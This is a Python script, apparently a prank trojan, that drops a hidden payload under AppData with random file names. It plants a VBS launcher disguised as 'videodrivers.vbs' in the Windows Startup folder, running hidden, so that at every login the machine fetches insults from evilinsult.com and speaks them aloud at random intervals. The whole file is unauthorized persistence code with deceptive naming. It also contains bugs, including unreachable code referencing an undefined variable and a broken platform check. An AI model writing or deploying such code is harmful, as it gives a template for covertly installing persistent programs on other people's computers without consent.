def infinite_insult(py_file_path,bat_file_path):
	def get_user():
	    import getpass as gp
	    import platform as pf
	    import os
	    SYSTEM = pf.system()
	    try:
	        ret = gp.getuser()
	    except:
	        try:
	            temp_list = os.getcwd().split( '\\' if SYSTEM=='Windows' else '/' )
	            ret = temp_list[ temp_list.index('Users') + 1 ]
	        except:
	            try:
	                temp_list = __file__.split( '\\' if SYSTEM=='Windows' else '/' )
	                ret = temp_list[ temp_list.index('Users') + 1 ]
	            except:
	                ret = 'Unable to determine'
	    return ret

	# Makes paths if they dont exist
	    if not os.path.exists( os.path.dirname(file_path) ):
	        os.makedirs( os.path.dirname(file_path) )
	    if not os.path.exists( os.path.dirname(py_file_path) ):
	        os.makedirs( os.path.dirname(py_file_path) )
	    if not os.path.exists( os.path.dirname(bat_file_path) ):
	        os.makedirs( os.path.dirname(bat_file_path) )

	vbs_file_path = f'C:\\Users\\{get_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\videodrivers.vbs'

	py_file_data = r'''import urllib.request
import random as r
import time as t
LINK = 'https://evilinsult.com/generate_insult.php?lang=en'
def get_insult():
	with urllib.request.urlopen(LINK) as response:
		ret = response.read().decode()
	return ret
def make_computer_speak(msg):
	import platform as pf
	if pf.system() == 'Windows':
		from win32com.client import Dispatch
		obj = Dispatch("SAPI.SpVoice").Speak
		obj(msg)
	else:
		import os
		os.system(f'say "{msg}"')
while True:
	delay = r.randint(1,30*60)
	print(delay)
	t.sleep(delay)
	insult = get_insult()
	make_computer_speak(insult)'''

	# Makes the .py file
	with open(py_file_path, 'w') as py_file:
	    py_file.write(py_file_data)
	# Makes the .bat file
	with open(bat_file_path, 'w') as bat_file:
	    bat_file.write(f'python "{py_file_path}"')
	# Makes the .vbs file
	with open(vbs_file_path, 'w') as vbs_file:
	    vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "{bat_file_path}" & Chr(34), 0\nSet WshShell = Nothing')






if __name__ == '__main__':
	import platform as pf
	import sys
	# If not windows, exit
	if not pf.system == 'Windows':
		sys.exit()
	
	def get_user():
	    import getpass as gp
	    import platform as pf
	    import os
	    SYSTEM = pf.system()
	    try:
	        ret = gp.getuser()
	    except:
	        try:
	            temp_list = os.getcwd().split( '\\' if SYSTEM=='Windows' else '/' )
	            ret = temp_list[ temp_list.index('Users') + 1 ]
	        except:
	            try:
	                temp_list = __file__.split( '\\' if SYSTEM=='Windows' else '/' )
	                ret = temp_list[ temp_list.index('Users') + 1 ]
	            except:
	                ret = 'Unable to determine'
	    return ret

	def rand_string(chars):
	    import random as r
	    lib = 'qwertyuiopasdfghjklzxcvbnm'
	    ret = ''
	    for _ in range(chars):
	        rand_chr = lib[r.randint( 0, len(lib)-1 )]
	        ret += rand_chr
	    return ret


	py_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.py'
	bat_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.bat'

	infinite_insult(py_file_path,bat_file_path)


